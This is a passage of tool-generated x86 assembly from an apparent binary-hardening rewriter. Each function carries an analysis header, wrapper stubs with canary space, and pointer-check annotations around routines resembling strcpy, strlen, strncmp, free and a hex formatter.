   mov     $0x1, %al                          # [6(2302)]# FLAGS USED   #32
   jne     Label_0x804a373 #32
   mov     %esi, (%esp)                       # [8(2304)]   #32
   call    Func_0x804a3a0  #pp1: Label_0x804a3a0 VAR_ADDRESS #32
   test    %eax, %eax                         # [10(2306)]   #32
   setne   %al                                # [11(2307)]   #32
Label_0x804a373: #p6a
   movzbl  %al, %eax                          # [12(2308)]   #32
   add     $0x8, %esp                         # [13(2309)]stackSize = 0x4   #32
   pop     %esi                               # [14(2310)]stackSize = 0x0   #32
Label_0x804a37a: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:36 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 57   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 3489 (0x804b260)
;       End Index : 3504 (0x804b293)
;   Num Instructs : 16
;      Stack Size : 0 (0x0)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 2
;      ESP Params : 
;                 :  0x8(0x4), 0xc(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x3920,7
.p2align 3,0x3925
FuncPtr_0x804b260:

Func_0x804b260:

Label_0x804b260:
   push    %ebx                               # [0(3489)]stackSize = 0x4   #32
   mov     0xc(%esp), %ecx                    # [1(3490)]   #32
   mov     (%ecx), %bl                        # [2(3491)]Using Pointer PTRCHECK arg[0]    #32
   xor     %edx, %edx                         # [3(3492)]   #32
   test    %bl, %bl                           # [4(3493)]   #32
   mov     0x8(%esp), %eax                    # [5(3494)]# FLAGS USED   #32
   je      Label_0x804b28e #32
   xor     %edx, %edx                         # [7(3496)]   #32
Label_0x804b280: #p6a
   mov     %bl, (%eax, %edx ,  0x1)           # [8(3497)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   mov     0x1(%ecx, %edx ,  0x1), %bl        # [9(3498)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   lea     0x1(%edx), %edx                    # [10(3499)] Loading Pointer with stackSize: 4   #32
   test    %bl, %bl                           # [11(3500)]   #32
   jne     Label_0x804b280 #32
Label_0x804b28e: #p6a
   movb    $0x0, (%eax, %edx ,  0x1)          # [13(3502)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   pop     %ebx                               # [14(3503)]stackSize = 0x0   #32
Label_0x804b293: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:57 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 42
     adding function wrapper

;     Start Index : 2423 (0x804a500)
;       End Index : 2450 (0x804a554)
;   Num Instructs : 28
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 3
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 3
;                 :  0x0(0x8), 0x4(0x4),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall deallocate

;
;-------------------------*/

.p2align 4,0x5820,7
.p2align 3,0x5825
FuncPtr_0x804a500:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a500,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a500:

Label_0x804a500:
   push    %esi                               # [0(2423)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2424)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2425)]   #32
   test    %esi, %esi                         # [3(2426)]   #32
   je      Label_0x804a535 #32
   cmpl    $0x0, -0x14(%esi)                  # [5(2428)] Using pointer with negative offset PTRCHECK arg[1]    #32
   jne     Label_0x804a535 #32
   add     $-0x18, %esi                       # [7(2430)]   #32
   cmpl    $0x40000, (%esi)                   # [8(2431)]Using Pointer PTRCHECK arg[1]    #32
   jb      Label_0x804a525 #32
   mov     %esi, %ecx                         # [10(2433)]   #32
   add     $0x8, %esp                         # [11(2434)]stackSize = 0x4   #32
   pop     %esi                               # [12(2435)]stackSize = 0x0   #32
   jmp     Label_0x804a540 #32
Label_0x804a525: #p6a
   mov     %esi, (%esp)                       # [14(2437)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a528
   .long    Func_0x804a790  #pp1w: Label_0x804a790 VAR_ADDRESS #32
   mov     %esi, (%esp)                       # [16(2439)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a530
   .long    Func_0x804a840  #pp1w: Label_0x804a840 VAR_ADDRESS #32
Label_0x804a535: #p6a
   add     $0x8, %esp                         # [18(2441)]stackSize = 0x4   #32
   pop     %esi                               # [19(2442)]stackSize = 0x0   #32
Label_0x804a539: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x804a540: #p6a
   sub     $0xc, %esp                         # [21(2444)]stackSize = 0xc   #32
   mov     (%ecx), %eax                       # [22(2445)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, 0x4(%esp)                    # [23(2446)]   #32
   mov     %ecx, (%esp)                       # [24(2447)]   #32
   call    _deallocate                        # [25(2448)]  System Call to deallocate() #32
   add     $0xc, %esp                         # [26(2449)]stackSize = 0x0   #32
Label_0x804a554: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:42 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 56
     adding function wrapper

;     Start Index : 3447 (0x804b200)
;       End Index : 3459 (0x804b221)
;   Num Instructs : 13
;      Stack Size : 0 (0x0)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 2
;      ESP Params : 
;                 :  0x8(0x4), 0xc(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x3920,7
.p2align 3,0x3925
FuncPtr_0x804b200:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b200,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b200:

Label_0x804b200:
   push    %esi                               # [0(3447)]stackSize = 0x4   #32
   mov     0x10(%esp), %ecx                   # [1(3448)]   #32
   mov     0xc(%esp), %edx                    # [2(3449)]   #32
Label_0x804b210: #p6a
   movsbl  (%edx), %esi                       # [3(3450)]Using Pointer PTRCHECK arg[0]    #32
   xor     %eax, %eax                         # [4(3451)]   #32
   test    %esi, %esi                         # [5(3452)]   #32
   je      Label_0x804b220 #32
   add     $0x1, %edx                         # [7(3454)]   #32
   cmp     %ecx, %esi                         # [8(3455)]   #32
   mov     %edx, %eax                         # [9(3456)]# FLAGS USED   #32
   jne     Label_0x804b210 #32
Label_0x804b220: #p6a
   pop     %esi                               # [11(3458)]stackSize = 0x0   #32
Label_0x804b221: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:56 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 41
     adding function wrapper

;     Start Index : 2390 (0x804a4a0)
;       End Index : 2402 (0x804a4c0)
;   Num Instructs : 13
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x020,7
.p2align 3,0x025
FuncPtr_0x804a4a0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a4a0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a4a0:

Label_0x804a4a0:
   push    %esi                               # [0(2390)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2391)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2392)]   #32
   mov     %esi, (%esp)                       # [3(2393)]   #32
   call    Func_0x804a3a0  #pp1: Label_0x804a3a0 VAR_ADDRESS #32
   mov     %esi, %ecx                         # [5(2395)]   #32
   or      $0x20, %ecx                        # [6(2396)]   #32
   test    %eax, %eax                         # [7(2397)]   #32
   cmove   %esi, %ecx                         # [8(2398)]   #32
   mov     %ecx, %eax                         # [9(2399)]   #32
   add     $0x8, %esp                         # [10(2400)]stackSize = 0x4   #32
   pop     %esi                               # [11(2401)]stackSize = 0x0   #32
Label_0x804a4c0: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:41 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 58   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 3537 (0x804b2e0)
;       End Index : 3543 (0x804b2fb)
;   Num Instructs : 7
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1920,7
.p2align 3,0x1925
FuncPtr_0x804b2e0:

Func_0x804b2e0:

Label_0x804b2e0:
   mov     0x4(%esp), %ecx                    # [0(3537)]   #32
   lea     -0x1(%ecx), %eax                   # [1(3538)] Loading Pointer with stackSize: 0   #32
Label_0x804b2f0: #p6a
   cmpb    $0x0, 0x1(%eax)                    # [2(3539)]Using Pointer PTRCHECK arg[1]    #32
   lea     0x1(%eax), %eax                    # [3(3540)] Loading Pointer with stackSize: 0# FLAGS USED   #32
   jne     Label_0x804b2f0 #32
   sub     %ecx, %eax                         # [5(3542)]   #32
Label_0x804b2fb: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:58 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 55
     adding function wrapper

;     Start Index : 3129 (0x804ae20)
;       End Index : 3201 (0x804aee4)
;   Num Instructs : 73
;      Stack Size : 44 (0x2c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 6
;      Local Vars : 0
;      ESP Others : 7
;     ESP Offsets : 13
;                 :  0x0(0x2c), 0x4(0x28), 0x8(0x24), 0xc(0x20),
;                 :  0x10(0x1c), 0x14(0x18), 0x28(0x4),
;      ESP Params : 
;                 :  0x40(0x4), 0x44(0x4), 0x48(0x4), 0x4c(0x4),
;                 :  0x50(0x4), 0x54(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 6
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x7520,7
.p2align 3,0x7525
FuncPtr_0x804ae20:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804ae20,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804ae20:

Label_0x804ae20:
   push    %ebp                               # [0(3129)]stackSize = 0x4   #32
   push    %ebx                               # [1(3130)]stackSize = 0x8   #32
   push    %edi                               # [2(3131)]stackSize = 0xc   #32
   push    %esi                               # [3(3132)]stackSize = 0x10   #32
   sub     $0x2c, %esp                        # [4(3133)]stackSize = 0x3c   #32
   mov     0x58(%esp), %edx                   # [5(3134)]   #32
   mov     0x50(%esp), %ecx                   # [6(3135)]   #32
   mov     0x4c(%esp), %esi                   # [7(3136)]   #32
   mov     0x48(%esp), %edi                   # [8(3137)]   #32
   mov     0x44(%esp), %ebp                   # [9(3138)]   #32
   xor     %eax, %eax                         # [10(3139)]   #32
   mov     %edx, %ebx                         # [11(3140)]   #32
   cmp     %ecx, %esi                         # [12(3141)]   #32
   jb      Label_0x804ae7a #32
   xor     %edx, %edx                         # [14(3143)]   #32
   mov     %esi, %eax                         # [15(3144)]   #32
   div     %ecx                               # [16(3145)]   #32
   mov     %eax, 0x28(%esp)                   # [17(3146)]   #32
   mov     %ebp, %eax                         # [18(3147)]   #32
   mov     0x54(%esp), %esi                   # [19(3148)]   #32
   lea     -0x1(%esi), %ebp                   # [20(3149)] Loading Pointer with stackSize: 60   #32
   mov     %edx, %esi                         # [21(3150)]   #32
   mov     %ebx, 0x14(%esp)                   # [22(3151)]   #32
   mov     %ebp, 0x10(%esp)                   # [23(3152)]   #32
   mov     %eax, %ebp                         # [24(3153)]   #32
   mov     %ecx, 0xc(%esp)                    # [25(3154)]   #32
   mov     0x28(%esp), %eax                   # [26(3155)]   #32
   mov     %eax, 0x8(%esp)                    # [27(3156)]   #32
   mov     %edi, 0x4(%esp)                    # [28(3157)]   #32
   mov     %ebp, (%esp)                       # [29(3158)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804ae75
   .long    Func_0x804ae20  #pp1w: Label_0x804ae20 VAR_ADDRESS #32
Label_0x804ae7a: #p6a
   mov     %eax, 0x28(%esp)                   # [31(3160)]   #32
   test    %eax, %eax                         # [32(3161)]   #32
   mov     %ebx, %eax                         # [33(3162)]# FLAGS USED   #32
   mov     0x54(%esp), %edx                   # [34(3163)]# FLAGS USED   #32
   jne     Label_0x804aeb7 #32
   test    %edx, %edx                         # [36(3165)]   #32
   jle     Label_0x804aeb7 #32
   cmp     $0x1, %edx                         # [38(3167)]   #32
   je      Label_0x804aeb7 #32
   mov     $0x1, %ecx                         # [40(3169)]   #32
   sub     %edx, %ecx                         # [41(3170)]   #32
Label_0x804aea0: #p6a
   mov     (%edi), %edx                       # [42(3171)]Using Pointer PTRCHECK arg[0]  Already checked [42]   #32
   mov     %al, %bl                           # [43(3172)]   #32
   shl     $0x4, %bl                          # [44(3173)]   #32
   and     $0x10, %bl                         # [45(3174)]   #32
   or      $0x20, %bl                         # [46(3175)]   #32
   mov     %bl, (%edx)                        # [47(3176)]Using Pointer PTRCHECK arg[1]    #32
   addl    $0x1, (%edi)                       # [48(3177)]Using Pointer PTRCHECK arg[0]  Already checked [49]   #32
   addl    $0x1, (%ebp)                       # [49(3178)]Using Pointer PTRCHECK arg[0]  Already checked [48]   #32
   add     $0x1, %ecx                         # [50(3179)]# FLAGS USED   #32
   jne     Label_0x804aea0 #32
Label_0x804aeb7: #p6a
   lea     0x30(%esi), %ecx                   # [52(3181)] Loading Pointer with stackSize: 60   #32
   test    $0x2, %al                          # [53(3182)]   #32
   je      Label_0x804aec6 #32
   cmp     $0xa, %esi                         # [55(3184)]   #32
   lea     0x37(%esi), %edx                   # [56(3185)] Loading Pointer with stackSize: 60# FLAGS USED   #32
   jmp     Label_0x804aecc #32
Label_0x804aec6: #p6a
   cmp     $0xa, %esi                         # [58(3187)]   #32
   lea     0x57(%esi), %edx                   # [59(3188)] Loading Pointer with stackSize: 60# FLAGS USED   #32
Label_0x804aecc: #p6a
   cmovb   %ecx, %edx                         # [60(3189)]   #32
   mov     (%edi), %ecx                       # [61(3190)]Using Pointer PTRCHECK arg[0]  Already checked [42]   #32
   mov     %dl, (%ecx)                        # [62(3191)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x28(%esp), %eax                   # [63(3192)]   #32
   addl    $0x1, (%edi)                       # [64(3193)]Using Pointer PTRCHECK arg[0]  Already checked [49]   #32
   addl    $0x1, (%ebp)                       # [65(3194)]Using Pointer PTRCHECK arg[0]  Already checked [64]   #32
   add     $0x1, %eax                         # [66(3195)]   #32
   add     $0x2c, %esp                        # [67(3196)]stackSize = 0x10   #32
   pop     %esi                               # [68(3197)]stackSize = 0xc   #32
   pop     %edi                               # [69(3198)]stackSize = 0x8   #32
   pop     %ebx                               # [70(3199)]stackSize = 0x4   #32
   pop     %ebp                               # [71(3200)]stackSize = 0x0   #32
Label_0x804aee4: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:55 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 88   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 3598 (0x804b380)
;       End Index : 3627 (0x804b3bf)
;   Num Instructs : 30
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0xc(0x4), 0x10(0x4), 0x14(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 2
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5820,7
.p2align 3,0x5825
FuncPtr_0x804b380:

Func_0x804b380:

Label_0x804b380:
   push    %ebx                               # [0(3598)]stackSize = 0x4   #32
   push    %esi                               # [1(3599)]stackSize = 0x8   #32
   xor     %eax, %eax                         # [2(3600)]   #32
   mov     0x14(%esp), %esi                   # [3(3601)]   #32
   test    %esi, %esi                         # [4(3602)]   #32
   je      Label_0x804b3bd #32
   mov     0x10(%esp), %eax                   # [6(3604)]   #32
   mov     0xc(%esp), %ecx                    # [7(3605)]   #32
   cmp     $0x1, %esi                         # [8(3606)]   #32
   je      Label_0x804b3b5 #32
   mov     $0x1, %edx                         # [10(3608)]   #32
   sub     %esi, %edx                         # [11(3609)]   #32
Label_0x804b3a0: #p6a
   mov     (%ecx), %bl                        # [12(3610)]Using Pointer PTRCHECK arg[0]    #32
   test    %bl, %bl                           # [13(3611)]   #32
   je      Label_0x804b3b5 #32
   mov     (%eax), %bh                        # [15(3613)]Using Pointer PTRCHECK arg[0]    #32
   test    %bh, %bh                           # [16(3614)]   #32
   je      Label_0x804b3b5 #32
   cmp     %bh, %bl                           # [18(3616)]   #32
   jne     Label_0x804b3b5 #32
   add     $0x1, %ecx                         # [20(3618)]   #32
   add     $0x1, %eax                         # [21(3619)]   #32
   add     $0x1, %edx                         # [22(3620)]# FLAGS USED   #32
   jne     Label_0x804b3a0 #32
Label_0x804b3b5: #p6a
   movsbl  (%eax), %eax                       # [24(3622)]Using Pointer PTRCHECK arg[0]  Already checked [15]   #32
   movsbl  (%ecx), %ecx                       # [25(3623)]Using Pointer PTRCHECK arg[0]  Already checked [12]   #32
   sub     %ecx, %eax                         # [26(3624)]   #32
Label_0x804b3bd: #p6a
   pop     %esi                               # [27(3625)]stackSize = 0x4   #32
   pop     %ebx                               # [28(3626)]stackSize = 0x0   #32
Label_0x804b3bf: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:88 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 68
     adding function wrapper

;     Start Index : 760 (0x8048b70)
;       End Index : 986 (0x8048ee3)
;   Num Instructs : 227
;      Stack Size : 44 (0x2c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 19
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 10
;     ESP Offsets : 11
;                 :  0x0(0x2c), 0x4(0x28), 0x8(0x24), 0xc(0x20),
;                 :  0x10(0x1c), 0x18(0x14), 0x1c(0x10), 0x20(0xc),
;                 :  0x24(0x8), 0x28(0x4),
;      ESP Params : 
;                 :  0x40(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 10
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1720,7
.p2align 3,0x1725
FuncPtr_0x8048b70:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048b70,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048b70:

Label_0x8048b70:
   push    %ebp                               # [0(760)]stackSize = 0x4   #32
   push    %ebx                               # [1(761)]stackSize = 0x8   #32
   push    %edi                               # [2(762)]stackSize = 0xc   #32
   push    %esi                               # [3(763)]stackSize = 0x10   #32
   sub     $0x2c, %esp                        # [4(764)]stackSize = 0x3c   #32
   xor     %ebx, %ebx                         # [5(765)]   #32
   cmpl    $0x0, 0x44(%esp)                   # [6(766)]   #32
   movl    $0x0, 0x28(%esp)                   # [7(767)]# FLAGS USED   #32
   movl    $0x0, 0x24(%esp)                   # [8(768)]# FLAGS USED   #32
   movl    $0x0, 0x20(%esp)                   # [9(769)]# FLAGS USED   #32
   jle     Label_0x8048eda #32
   lea     0x20(%esp), %ebp                   # [11(771)] Loading Pointer with stackSize: 60   #32
   xor     %eax, %eax                         # [12(772)]   #32
Label_0x8048bb0: #p6a
   mov     %eax, 0x1c(%esp)                   # [13(773)]   #32
   mov     Var_0x80602a8, %ecx                # [14(774)]   #32
   mov     $0x1, %edx                         # [15(775)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048bbf
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   mov     %eax, %esi                         # [17(777)]   #32
   test    %esi, %esi                         # [18(778)]   #32
   mov     %esi, %edi                         # [19(779)]# FLAGS USED   #32
   je      Label_0x8048c11 #32
Label_0x8048bd0: #p6a
   movsd   (%edi), %xmm0                      # [21(781)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%edi), %xmm1                   # [22(782)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [23(783)]   #32
   movsd   %xmm0, (%esp)                      # [24(784)]   #32
   mov     %ebp, 0x10(%esp)                   # [25(785)]   #32
   lea     0x28(%esp), %ecx                   # [26(786)] Loading Pointer with stackSize: 60   #32
   lea     0x24(%esp), %edx                   # [27(787)] Loading Pointer with stackSize: 60   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048bf0
   .long    Func_0x8048ff0  #pp1w: Label_0x8048ff0 VAR_ADDRESS #32
   mov     0x14(%edi), %edi                   # [29(789)]Using Pointer PTRCHECK arg[0]    #32
   test    %edi, %edi                         # [30(790)]   #32
   jne     Label_0x8048bd0 #32
   test    %esi, %esi                         # [32(792)]   #32
   je      Label_0x8048c11 #32
Label_0x8048c00: #p6a
   mov     0x14(%esi), %edi                   # [34(794)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, (%esp)                       # [35(795)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048c06
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %edi, %edi                         # [37(797)]   #32
   mov     %edi, %esi                         # [38(798)]# FLAGS USED   #32
   jne     Label_0x8048c00 #32
Label_0x8048c11: #p6a
   mov     0x20(%esp), %esi                   # [40(800)]   #32
   test    %esi, %esi                         # [41(801)]   #32
   je      Label_0x8048c35 #32
Label_0x8048c20: #p6a
   mov     %esi, %eax                         # [43(803)]   #32
   mov     0xc(%eax), %esi                    # [44(804)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [45(805)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048c28
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %esi, %esi                         # [47(807)]   #32
   jne     Label_0x8048c20 #32
   mov     %esi, 0x20(%esp)                   # [49(809)]   #32
Label_0x8048c35: #p6a
   mov     %ebx, 0x18(%esp)                   # [50(810)]   #32
   mov     0x28(%esp), %esi                   # [51(811)]   #32
   test    %esi, %esi                         # [52(812)]   #32
   je      Label_0x8048ca5 #32
Label_0x8048c50: #p6a
   mov     Var_0x80602a8, %eax                # [54(814)]   #32
   movsd   (%esi), %xmm0                      # [55(815)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%esi), %xmm1                   # [56(816)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0xc(%esp)                   # [57(817)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [58(818)]   #32
   mov     %eax, (%esp)                       # [59(819)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048c6d
   .long    Func_0x80489a0  #pp1w: Label_0x80489a0 VAR_ADDRESS #32
   mov     0x14(%esi), %esi                   # [61(821)]Using Pointer PTRCHECK arg[0]    #32
   test    %esi, %esi                         # [62(822)]   #32
   jne     Label_0x8048c50 #32
   mov     0x28(%esp), %esi                   # [64(824)]   #32
   test    %esi, %esi                         # [65(825)]   #32
   je      Label_0x8048ca5 #32
Label_0x8048c90: #p6a
   mov     %esi, %eax                         # [67(827)]   #32
   mov     0x14(%eax), %esi                   # [68(828)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [69(829)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048c98
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %esi, %esi                         # [71(831)]   #32
   jne     Label_0x8048c90 #32
   mov     %esi, 0x28(%esp)                   # [73(833)]   #32
Label_0x8048ca5: #p6a
   mov     0x24(%esp), %esi                   # [74(834)]   #32
   test    %esi, %esi                         # [75(835)]   #32
   je      Label_0x8048d05 #32
Label_0x8048cb0: #p6a
   mov     Var_0x80602a8, %eax                # [77(837)]   #32
   movsd   (%esi), %xmm0                      # [78(838)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%esi), %xmm1                   # [79(839)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0xc(%esp)                   # [80(840)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [81(841)]   #32
   mov     %eax, (%esp)                       # [82(842)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048ccd
   .long    Func_0x80489a0  #pp1w: Label_0x80489a0 VAR_ADDRESS #32
   mov     0x14(%esi), %esi                   # [84(844)]Using Pointer PTRCHECK arg[0]    #32
   test    %esi, %esi                         # [85(845)]   #32
   jne     Label_0x8048cb0 #32
   mov     0x24(%esp), %esi                   # [87(847)]   #32
   test    %esi, %esi                         # [88(848)]   #32
   je      Label_0x8048d05 #32
Label_0x8048cf0: #p6a
   mov     %esi, %eax                         # [90(850)]   #32
   mov     0x14(%eax), %esi                   # [91(851)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [92(852)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048cf8
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %esi, %esi                         # [94(854)]   #32
   jne     Label_0x8048cf0 #32
   mov     %esi, 0x24(%esp)                   # [96(856)]   #32
Label_0x8048d05: #p6a
   mov     Var_0x80602a8, %ecx                # [97(857)]   #32
   mov     $0x3, %edx                         # [98(858)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048d10
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   mov     %eax, %esi                         # [100(860)]   #32
   xor     %ebp, %ebp                         # [101(861)]   #32
   test    %esi, %esi                         # [102(862)]   #32
   mov     %esi, %edi                         # [103(863)]# FLAGS USED   #32
   je      Label_0x8048e01 #32
Label_0x8048d30: #p6a
   mov     %ebp, %ebx                         # [105(865)]   #32
   subl    $0x1, 0xc(%edi)                    # [106(866)]Using Pointer PTRCHECK arg[0]  Already checked [106]   #32
   mov     Var_0x80602a8, %eax                # [107(867)]   #32
   movsd   (%edi), %xmm0                      # [108(868)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%edi), %xmm1                   # [109(869)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0xc(%esp)                   # [110(870)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [111(871)]   #32
   mov     %eax, (%esp)                       # [112(872)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048d52
   .long    Func_0x80489a0  #pp1w: Label_0x80489a0 VAR_ADDRESS #32
   movl    $0x18, 0x4(%esp)                   # [114(874)]   #32
   movl    $0x1, (%esp)                       # [115(875)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048d66
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   mov     %eax, %ebp                         # [117(877)]   #32
   movsd   (%edi), %xmm0                      # [118(878)]Using Pointer PTRCHECK arg[0]  Already checked [108]   #32
   movsd   0x8(%edi), %xmm1                   # [119(879)]Using Pointer PTRCHECK arg[0]  Already checked [109]   #32
